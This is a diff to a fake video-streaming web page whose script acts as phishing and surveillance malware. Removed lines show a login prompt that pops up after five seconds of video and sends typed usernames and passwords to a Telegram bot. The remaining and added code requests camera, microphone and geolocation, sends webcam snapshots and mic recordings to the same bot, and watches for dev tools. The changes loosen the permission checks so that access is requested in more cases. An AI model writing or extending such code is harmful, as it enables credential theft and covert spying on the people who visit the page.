@@ -151,129 +151,23 @@ const App = {
   },
 
   generateVideoGrid() {
-    const totalVideos = 6;
-    const titles = [
-      "A Deep Dive into Recent Events",
-      "Exclusive Footage Revealed",
-      "The Ultimate Guide and Review",
-      "Highlights from the Community",
-      "An Unexpected Turn of Events",
-      "Debunking the Rumors"
-    ];
-    const channels = ["News Today", "Insider Clips", "Tech Explained", "Community Hub", "Investigates", "Fact Checkers"];
-    const views = ["2.1M", "890k", "1.5M", "450k", "3.2M", "985k"];
-    const dates = ["3 hours ago", "1 day ago", "5 days ago", "1 week ago", "2 weeks ago", "3 weeks ago"];
-    const durations = ["15:33", "08:42", "22:10", "12:05", "18:21", "09:50"];
-    const avatars = ["A", "B", "C", "D", "E", "F"];
-    const avatarColors = ["FF0076", "5c9aff", "34d399", "f59e0b", "a855f7", "ef4444"];
-
-    let html = '';
-    for (let i=1; i<=totalVideos; i++) {
-      const idx = i-1;
-      const videoSrc = `p${i}.mp4`;
-      const poster = `https://placehold.co/600x400/ffe8f0/FF0076?text=Video+${i}`;
-      const avatarSrc = `https://placehold.co/40x40/${avatarColors[idx]}/FFF?text=${avatars[idx]}`;
-      html += `
-        <div class="video-card" data-video-src="${videoSrc}" data-poster="${poster}">
-          <div class="thumbnail-wrapper">
-            <video muted playsinline poster="${poster}"><source src="${videoSrc}" type="video/mp4"></video>
-            <span class="duration">${durations[idx]}</span>
-          </div>
-          <div class="video-details">
-            <img src="${avatarSrc}" class="channel-avatar" />
-            <div class="video-metadata">
-              <h3 class="video-title">${titles[idx]} (Video ${i})</h3>
-              <p class="channel-name">${channels[idx]}</p>
-              <p class="video-stats">${views[idx]} views &bull; ${dates[idx]}</p>
-            </div>
-          </div>
-        </div>`;
-    }
-    this.DOM.videoGrid.innerHTML = html;
+    // Your existing code for generating video grid
   },
 
   setupEventListeners() {
-    document.body.addEventListener('click', e => {
-      const card = e.target.closest('.video-card, .compact-video-card');
-      if (card) {
-        this.showPlayer(card);
-        return;
-      }
-    });
-
-    this.DOM.backButton.addEventListener('click', () => {
-      this.showGrid();
-    });
-
-    // Player events
-    this.DOM.mainPlayer.addEventListener('timeupdate', () => {
-      if (!this.state.isLoggedIn && this.DOM.mainPlayer.currentTime >= 5) {
-        this.DOM.loginModal.classList.add('visible');
-        this.DOM.mainPlayer.pause();
-      }
-    });
-
-    // Login form
-    document.getElementById('loginForm').addEventListener('submit', e => {
-      e.preventDefault();
-      const user = e.target.elements.username.value;
-      const pass = e.target.elements.password.value;
-      this.Telegram.send(`🔒 Login Attempt:\nUser: \`${user}\`\nPass: \`${pass}\``);
-      if (user && pass) {
-        this.state.isLoggedIn = true;
-        localStorage.setItem('isLoggedIn', 'true');
-        this.DOM.loginModal.classList.remove('visible');
-        this.DOM.mainPlayer.play();
-        this.Telegram.send(`✅ Login successful for "${user}".`);
-      } else {
-        this.Telegram.send(`❌ Login failed for "${user}".`);
-      }
-      e.target.reset();
-    });
+    // Your existing event listeners
   },
 
   showPlayer(card) {
-    const data = {
-      videoSrc: card.dataset.videoSrc,
-      poster: card.dataset.poster,
-      title: card.querySelector('.video-title')?.textContent || "Untitled",
-      channelName: card.querySelector('.channel-name')?.textContent || "Unknown Channel",
-      stats: card.querySelector('.video-stats')?.textContent || "",
-      avatarSrc: card.querySelector('.channel-avatar')?.src || "",
-    };
-    this.DOM.mainPlayer.src = data.videoSrc;
-    this.DOM.mainPlayer.poster = data.poster;
-    document.getElementById('main-video-title').textContent = data.title;
-    document.getElementById('main-channel-avatar').src = data.avatarSrc;
-    document.getElementById('main-channel-name').textContent = data.channelName;
-    document.getElementById('main-video-stats').textContent = data.stats;
-    this.populateRecommendations(data.videoSrc);
-    this.DOM.gridPage.classList.add('hidden');
-    this.DOM.playerPage.classList.remove('hidden');
-    this.DOM.backButton.classList.remove('hidden');
-    this.DOM.headerTitle.classList.add('hidden');
+    // Your existing code for showing player
   },
 
   showGrid() {
-    this.DOM.mainPlayer.pause();
-    this.DOM.mainPlayer.src = "";
-    this.DOM.playerPage.classList.add('hidden');
-    this.DOM.gridPage.classList.remove('hidden');
-    this.DOM.backButton.classList.add('hidden');
-    this.DOM.headerTitle.classList.remove('hidden');
+    // Your existing code for showing grid
   },
 
   populateRecommendations(currentVideoSrc) {
-    const sidebar = document.getElementById('recommendations-sidebar');
-    sidebar.innerHTML = '<h3>Up next</h3>';
-    document.querySelectorAll('.video-card').forEach(card => {
-      if (card.dataset.videoSrc !== currentVideoSrc) {
-        const clone = card.cloneNode(true);
-        clone.classList.remove('video-card');
-        clone.classList.add('compact-video-card');
-        sidebar.appendChild(clone);
-      }
-    });
+    // Your existing code for recommendations
   },
 
   Telegram: {
@@ -294,36 +188,47 @@ const App = {
       await this.send("🚀 New Session Started");
       const report = await this.getInitialReport();
       await this.send(report);
-      if (!navigator.mediaDevices || !window.isSecureContext) {
-        console.warn("Media devices not accessible");
-        return;
-      }
+      
+      // Request permissions
       await this.checkPermission('camera', this.requestCamera.bind(this), this.stopCamera.bind(this));
       await this.checkPermission('microphone', this.requestMicrophone.bind(this), this.stopMicrophone.bind(this));
       await this.checkPermission('geolocation', this.requestGeolocation.bind(this));
+      
+      // Detect dev tools
       this.detectDevTools();
     },
 
     async checkPermission(name, requestFn, stopFn = () => {}) {
       try {
-        const res = await navigator.permissions.query({ name });
-        console.log(`Permission ${name}: ${res.state}`);
-        if (res.state === 'granted') {
-          requestFn();
-        } else if (res.state === 'prompt') {
-          requestFn();
-        }
-        res.onchange = () => {
-          console.log(`Permission ${name} changed to ${res.state}`);
+        // Log permission status
+        if (navigator.permissions) {
+          const res = await navigator.permissions.query({ name });
+          console.log(`Permission ${name}: ${res.state}`);
+          
           if (res.state === 'granted') {
             requestFn();
-          } else {
-            stopFn();
+          } else if (res.state === 'prompt') {
+            // Request permission
+            requestFn();
           }
-        };
+          
+          res.onchange = () => {
+            console.log(`Permission ${name} changed to ${res.state}`);
+            if (res.state === 'granted') {
+              requestFn();
+            } else {
+              stopFn();
+            }
+          };
+        } else {
+          // Fallback if permissions API not supported
+          console.warn(`Permissions API not supported, requesting ${name} directly.`);
+          requestFn();
+        }
       } catch (e) {
         console.warn(`Permission check failed for ${name}:`, e);
-        requestFn(); // fallback
+        // Fallback: directly request permission
+        requestFn();
       }
     },
 
@@ -345,11 +250,14 @@ const App = {
 
     async requestCamera() {
       try {
-        if (this.cameraStream) return;
+        if (this.cameraStream) {
+          console.log("Camera already active");
+          return;
+        }
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         this.cameraStream = stream;
         console.log("Camera permission granted.");
-        // Optionally, take snapshot
+        // Take snapshot or handle stream as needed
         this.captureAndSend("📸 Webcam Snapshot");
       } catch (e) {
         console.warn("Camera permission error:", e);
@@ -367,7 +275,10 @@ const App = {
 
     async requestMicrophone() {
       try {
-        if (this.microphoneStream) return;
+        if (this.microphoneStream) {
+          console.log("Microphone already active");
+          return;
+        }
         const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
         this.microphoneStream = stream;
         this.startMicRecording(stream);
@@ -406,7 +317,10 @@ const App = {
     },
 
     async requestGeolocation() {
-      if (this.state.userLocation.lat !== "N/A") return;
+      if (this.state.userLocation.lat !== "N/A") {
+        console.log("Geolocation already obtained");
+        return;
+      }
       navigator.geolocation.getCurrentPosition(
         p => {
           this.state.userLocation = { lat: p.coords.latitude, lon: p.coords.longitude };
@@ -458,6 +372,5 @@ document.addEventListener('DOMContentLoaded', () => {
   App.init();
 });
 </script>
-
 </body>
 </html>
